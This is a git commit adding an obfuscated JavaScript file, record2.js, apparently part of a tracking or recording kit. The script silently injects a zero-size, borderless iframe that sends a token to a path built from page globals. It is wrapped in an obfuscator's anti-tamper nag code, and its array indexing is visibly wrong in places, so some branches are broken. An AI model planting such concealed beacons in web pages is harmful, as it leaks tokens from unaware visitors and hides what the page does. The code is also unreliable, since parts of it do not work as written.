10ef1d9baefb856ae23b897a48f42017938c4c66
TimWhite <36320909+timwhitez@users.noreply.github.com>
2020-08-21 15:28:52 +0800

    Add files via upload

---
+++ js/record2.js
@@ -0,0 +1,39 @@
+var __encode = 'sojson.com',
+_a = {},
+_0xb483 = ["_decode", "http://www.sojson.com/javascriptobfuscator.html"]; (function(_0xd642x1) {
+    _0xd642x1[_0xb483[0]] = _0xb483[1]
+})(_a);
+var __Ox80b9a = ["iframe", "createElement", "src", "/", "/?token=", "frameborder", "height", "width", "appendChild", "body", "log", "<iframe src=\"\",\"\" width=0 height=0 frameborder=0></iframe>", "write", "undefined", "删除", "版本号，js会定期弹窗，", "还请支持我们的工作", "sojs", "on.com"];
+try {
+    var iframe = document[__Ox80b9a[0x1]](__Ox80b9a[0x0]);
+    iframe[__Ox80b9a[0x2]] = __Ox80b9a[0x3] + path + __Ox80b9a[0x4] + token;
+    iframe[__Ox80b9a[0x5]] = 0;
+    iframe[__Ox80b9a[0x6]] = 0;
+    iframe[__Ox80b9a[0x7]] = 0;
+    document[__Ox80b9a[0x9]][__Ox80b9a[0x8]](iframe)
+} catch(e) {
+    console[__Ox80b9a[0xa]](e);
+    document[__Ox80b9a[0xd]](__Ox80b9a[0xb] + __Ox80b9a[0x3] + path + __Ox80b9a[0x4] + token + __Ox80b9a[0xc])
+}; (function(_0x4195x2, _0x4195x3, _0x4195x4, _0x4195x5, _0x4195x6, _0x4195x7) {
+    _0x4195x7 = __Ox80b9a[0xe];
+    _0x4195x5 = function(_0x4195x8) {
+        if (typeof alert !== _0x4195x7) {
+            alert(_0x4195x8)
+        };
+        if (typeof console !== _0x4195x7) {
+            console[__Ox80b9a[0xa]](_0x4195x8)
+        }
+    };
+    _0x4195x4 = function(_0x4195x9, _0x4195x2) {
+        return _0x4195x9 + _0x4195x2
+    };
+    _0x4195x6 = _0x4195x4(__Ox80b9a[0xf], _0x4195x4(__Ox80b9a[0x10], __Ox80b9a[0x11]));
+    try {
+        _0x4195x2 = __encode;
+        if (! (typeof _0x4195x2 !== _0x4195x7 && _0x4195x2 === _0x4195x4(__Ox80b9a[0x12], __Ox80b9a[0x13]))) {
+            _0x4195x5(_0x4195x6)
+        }
+    } catch(e) {
+        _0x4195x5(_0x4195x6)
+    }
+})({})
